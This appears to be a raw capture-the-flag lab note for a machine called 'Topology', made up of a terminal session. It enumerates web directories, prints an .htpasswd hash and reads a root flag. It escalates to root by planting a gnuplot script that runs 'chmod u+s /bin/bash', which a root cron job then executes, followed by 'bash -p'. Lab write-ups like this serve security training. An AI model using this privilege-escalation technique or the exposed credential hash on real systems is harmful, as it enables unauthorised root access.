2023/07/22 19:35:01 CMD: UID=0     PID=2816   | sed s/,//g 
2023/07/22 19:35:01 CMD: UID=0     PID=2815   | cut -d  -f 3 
2023/07/22 19:35:01 CMD: UID=0     PID=2814   | grep -o load average:.*$ 
2023/07/22 19:35:01 CMD: UID=0     PID=2813   | 
2023/07/22 19:35:01 CMD: UID=0     PID=2817   | /bin/sh /opt/gnuplot/getdata.sh 
2023/07/22 19:35:01 CMD: UID=0     PID=2818   | /bin/sh /opt/gnuplot/getdata.sh 
2023/07/22 19:35:01 CMD: UID=0     PID=2819   | gnuplot /opt/gnuplot/networkplot.plt 
2023/07/22 19:35

vdaisley@topology:/tmp$ cd /var/www/
vdaisley@topology:/var/www$ ls
dev  html  latex  stats
vdaisley@topology:/var/www$ cd html
vdaisley@topology:/var/www/html$ ls -lah
total 28K
drwxr-xr-x 5 www-data www-data 4.0K Jan 17  2023 .
drwxr-xr-x 6 root     root     4.0K May 19 13:04 ..
drwxrwxr-x 2 www-data www-data 4.0K Jan 17  2023 css
drwxrwxr-x 2 www-data www-data 4.0K Jan 17  2023 images
-rw-rw-r-- 1 www-data www-data 6.7K Jan 17  2023 index.html
drwxrwxr-x 2 www-data www-data 4.0K Jan 17  2023 portraits
-rw-rw-r-- 1 www-data www-data    0 Jan 17  2023 style.css
vdaisley@topology:/var/www/html$ cd ..
vdaisley@topology:/var/www$ cd latex/
vdaisley@topology:/var/www/latex$ ls -lah
total 92K
drwxr-xr-x 4 www-data www-data 4.0K Jun 12 07:38 .
drwxr-xr-x 6 root     root     4.0K May 19 13:04 ..
drwxr-xr-x 2 www-data www-data 4.0K Jan 17  2023 demo
-rw-rw-r-- 1 www-data www-data 3.9K Jun 12 07:37 equation.php
-rw-rw-r-- 1 www-data www-data  662 Jan 17  2023 equationtest.aux
-rw-rw-r-- 1 www-data www-data  17K Jan 17  2023 equationtest.log
-rw-rw-r-- 1 www-data www-data    0 Jan 17  2023 equationtest.out
-rw-rw-r-- 1 www-data www-data  29K Jan 17  2023 equationtest.pdf
-rw-rw-r-- 1 www-data www-data 2.8K Jan 17  2023 equationtest.png
-rw-rw-r-- 1 www-data www-data  112 Jan 17  2023 equationtest.tex
-rw-rw-r-- 1 www-data www-data 1.4K Jan 17  2023 example.png
-rw-rw-r-- 1 www-data www-data  502 Jan 17  2023 header.tex
drwxrwxrwx 2 www-data www-data 4.0K Jul 22 19:23 tempfiles
vdaisley@topology:/var/www/latex$ cd ../dev/
vdaisley@topology:/var/www/dev$ ls -lah
total 40K
drwxr-xr-x 2 www-data www-data 4.0K Jan 17  2023 .
drwxr-xr-x 6 root     root     4.0K May 19 13:04 ..
-rw-r--r-- 1 www-data www-data  100 Jan 17  2023 .htaccess
-rw-r--r-- 1 www-data www-data   47 Jan 17  2023 .htpasswd
-rw-r--r-- 1 www-data www-data 7.0K Jan 17  2023 index.html
-rw-r--r-- 1 www-data www-data 1.1K Jan 17  2023 LICENSE
-rw-r--r-- 1 www-data www-data 1.7K Jan 17  2023 script.js
-rw-r--r-- 1 www-data www-data 5.6K Jan 17  2023 styles.css
vdaisley@topology:/var/www/dev$ cat .htpasswd
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
vdaisley@topology:/var/www/dev$ cat script.js
const body = document.body

const btnTheme = document.querySelector('.fa-moon')
const btnHamburger = document.querySelector('.fa-bars')

const addThemeClass = (bodyClass, btnClass) => {
  body.classList.add(bodyClass)
  btnTheme.classList.add(btnClass)
}

const getBodyTheme = localStorage.getItem('portfolio-theme')
const getBtnTheme = localStorage.getItem('portfolio-btn-theme')

addThemeClass(getBodyTheme, getBtnTheme)

const isDark = () => body.classList.contains('dark')

const setTheme = (bodyClass, btnClass) => {

	body.classList.remove(localStorage.getItem('portfolio-theme'))
	btnTheme.classList.remove(localStorage.getItem('portfolio-btn-theme'))

  addThemeClass(bodyClass, btnClass)

	localStorage.setItem('portfolio-theme', bodyClass)
	localStorage.setItem('portfolio-btn-theme', btnClass)
}

const toggleTheme = () =>
	isDark() ? setTheme('light', 'fa-moon') : setTheme('dark', 'fa-sun')

btnTheme.addEventListener('click', toggleTheme)

const displayList = () => {
	const navUl = document.querySelector('.nav__list')

	if (btnHamburger.classList.contains('fa-bars')) {
		btnHamburger.classList.remove('fa-bars')
		btnHamburger.classList.add('fa-times')
		navUl.classList.add('display-nav-list')
	} else {
		btnHamburger.classList.remove('fa-times')
		btnHamburger.classList.add('fa-bars')
		navUl.classList.remove('display-nav-list')
	}
}

btnHamburger.addEventListener('click', displayList)

const scrollUp = () => {
	const btnScrollTop = document.querySelector('.scroll-top')

	if (
		body.scrollTop > 500 ||
		document.documentElement.scrollTop > 500
	) {
		btnScrollTop.style.display = 'block'
	} else {
		btnScrollTop.style.display = 'none'
	}
}

document.addEventListener('scroll', scrollUp)

vdaisley@topology:/var/www/dev$ cat .htaccess 
AuthName "Under construction"
AuthType Basic
AuthUserFile /var/www/dev/.htpasswd
Require valid-user

vdaisley@topology:/opt$ tty
/dev/pts/0
vdaisley@topology:/opt$ w
 19:38:22 up 51 min,  1 user,  load average: 0.01, 0.10, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vdaisley pts/0    10.10.14.19      19:32    3.00s  0.11s  0.01s w
vdaisley@topology:/opt$ who
vdaisley pts/0        2023-07-22 19:32 (10.10.14.19)

vdaisley@topology:/opt$ ls -lah
total 12K
drwxr-xr-x  3 root root 4.0K May 19 13:04 .
drwxr-xr-x 18 root root 4.0K Jun 12 10:37 ..
drwx-wx-wx  2 root root 4.0K Jun 14 07:45 gnuplot

vdaisley@topology:/opt$ touch /opt/gnuplot/test.plt

vdaisley@topology:/opt/gnuplot$ ls -lah
ls: cannot open directory '.': Permission denied

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/

vdaisley@topology:/opt$ echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/test.plt

vdaisley@topology:/opt$ ls -lah /opt/gnuplot/test.plt
-rw-rw-r-- 1 vdaisley vdaisley 29 Jul 22 19:45 /opt/gnuplot/test.plt
vdaisley@topology:/opt$ bash -p
bash-5.0# cd /root
bash-5.0# id
uid=1007(vdaisley) gid=1007(vdaisley) euid=0(root) egid=0(root) groups=0(root),1007(vdaisley)
bash-5.0# ls
root.txt
bash-5.0# cat root.txt
3f61e9249baa17527ddd449996848178


```


![[Pasted image 20230722175827.png]]

[[Pilgrimage]]